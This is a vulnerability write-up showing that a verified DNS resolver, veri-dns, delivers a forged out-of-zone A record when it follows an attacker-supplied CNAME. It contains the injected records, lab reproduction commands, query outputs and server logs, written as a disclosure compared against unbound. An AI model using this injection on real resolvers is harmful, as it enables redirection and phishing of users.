# 019 — Client-answer scrub authenticates by CNAME-reachability, not bailiwick: out-of-zone A for a CNAME target is delivered verbatim

- **Status:** CONFIRMED (impl-bug) — reproduced on the rig against the running binary.
- **Component:** `VeriDNS/Impl/AnswerScrub.lean` (`reachTarget?`/`reachStepB`/`scrubAnswerB`) +
  classification short-circuit `VeriDNS/Impl/Resolver.lean:75-82` (`answersQueryB`/`cnameToChase`) +
  delivery `VeriDNS/Impl/Server.lean` (`replyForResolution`).
- **Reference behaviour:** unbound `iterator/iter_scrub.c` (out-of-zone RRs stripped: an RRset not
  `pkt_sub` of the delegation zonename is removed from the message), forcing independent
  re-resolution of the CNAME target from its own authoritative servers.

## Summary

The sole client-delivery anti-poison, `scrubAnswerB`, keeps a record iff its owner name is
**CNAME-reachable** from the query name. `reachStepB` adds the *target* of any CNAME whose owner is
already reachable, with **no bailiwick / zonename check**. So an authoritative server for
`example.test.` can put a CNAME to a name in a **foreign zone** into the answer, plus a forged A for
that foreign name, and both survive the scrub. Because `answersQueryB` then sees an A of the queried
type it short-circuits to the direct-answer branch and never re-resolves the CNAME target from the
foreign zone's real servers. The stub receives an attacker-chosen A for a name it does not own.

This is cross-zone answer injection through the CNAME conduit. `bailiwickRaws` only protects the
*cache* copy; the delivered response is unfiltered, so the poison reaches the client even though it
is never cached.

## Rig reproduction

A crafted authoritative leaf for `example.test.` (`cnameinject.py`, bound on the leaf IP
`10.53.0.12:53` in place of nsd-leaf) answers `www.example.test/A` with an answer section:

```
www.example.test.   3600 IN CNAME login.bank.test.      ; target in a FOREIGN zone
login.bank.test.    3600 IN A     6.6.6.6               ; OUT-OF-ZONE poison
```

An honest `bank.test.` zone was added to the hierarchy (delegated from the `test.` tld server) with
the real record `login.bank.test A 10.53.0.200`, served by `bankauth.py` on `10.53.0.30:53`, so the
contrast is "real vs poison".

Both resolvers restarted (caches flushed), then, from the `attacker` namespace:

### veri-dns (@10.53.0.2:5300) — DELIVERS THE POISON

```
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38929
;; flags: qr ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0
;; ANSWER SECTION:
www.example.test.	3600	IN	CNAME	login.bank.test.
login.bank.test.	3600	IN	A	6.6.6.6          <-- attacker IP, verbatim
```

### unbound (@10.53.0.3:5301) — STRIPS IT, RE-RESOLVES INDEPENDENTLY

```
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7735
;; flags: qr rd ra; QUERY: 1, ANSWER: 2
;; ANSWER SECTION:
www.example.test.	3600	IN	CNAME	login.bank.test.
login.bank.test.	3600	IN	A	10.53.0.200      <-- REAL address from bank.test
```

### Proof veri-dns never re-resolved (authoritative-server logs)

`bankauth.py` (the real `bank.test.` server, 10.53.0.30) logged who asked it for `login.bank.test`:

```
q login.bank.test./1 from 10.53.0.99   (attacker's direct dig)
q login.bank.test./1 from 10.53.0.3    (unbound — re-resolving after stripping)
q login.bank.test./1 from 10.53.0.3
```

**No query from 10.53.0.2 (veri-dns).** veri-dns queried the crafted leaf for `www.example.test`
and then handed the client the injected A without ever contacting `bank.test.`'s authoritative
server. This is the load-bearing observation: the out-of-bailiwick A was trusted, not verified.

## Exact commands

```sh
# crafted leaf replaces nsd-leaf on 10.53.0.12
systemctl stop veridns-auth-leaf
systemd-run --unit=veridns-cnameinject --collect \
    ip netns exec auth python3 /opt/dnsenv/cnameinject.py 10.53.0.12 53
# honest bank.test + delegation from the tld zone; bankauth on 10.53.0.30
ip netns exec auth ip addr add 10.53.0.30/24 dev v-auth
# (append `bank IN NS ns.bank.test. / ns.bank.test. IN A 10.53.0.30` to test.zone; restart tld)
systemd-run --unit=veridns-bankauth --collect \
    ip netns exec auth python3 /opt/dnsenv/bankauth.py 10.53.0.30 53
systemctl restart veridns-verid veridns-ref     # flush caches

ip netns exec attacker dig @10.53.0.2 -p 5300 www.example.test A   # -> 6.6.6.6
ip netns exec attacker dig @10.53.0.3 -p 5301 www.example.test A   # -> 10.53.0.200
```

Responder scripts staged at `penn-testing/_vmdns/cnameinject.py` and `.../bankauth.py`.

## Why the verified scrub does not catch this

`reachStepB` (`AnswerScrub.lean:34-40`) and the model's `CnameReachable.step`
(`Spec/AnswerAuthenticity.lean:62-66`) close the reach set over CNAME targets with no predicate
that the target be under the same delegation. The proof `scrubAnswerB_no_foreign` therefore proves
only "every delivered owner is CNAME-reachable from qname" — which is exactly the property that lets
a foreign-zone A ride in behind a CNAME. The spec models the attacker's conduit as legitimate, so
the theorem is true and useless here. RFC 1034 §5.4.1 / the iterative-resolution model require the
CNAME target to be resolved anew from its own authority; a record for it supplied by a different
zone's server is out of bailiwick and must not be trusted.

## Impact

A DNS operator (or anyone who compromises one) authoritative for any zone a victim will look up can
return a CNAME to `login.yourbank.test` (or any high-value name) plus a forged A, and veri-dns
delivers the attacker's address to the stub for that foreign name. It is not cached (bailiwick check
protects the cache), but the client is answered — sufficient for a single-shot redirect/phishing hit
per query. unbound is not vulnerable.

## Cleanup / restore

```sh
systemctl stop veridns-cnameinject veridns-bankauth
systemctl start veridns-auth-leaf
# remove the bank delegation lines from test.zone and restart veridns-auth-tld
ip netns exec auth ip addr del 10.53.0.30/24 dev v-auth
```
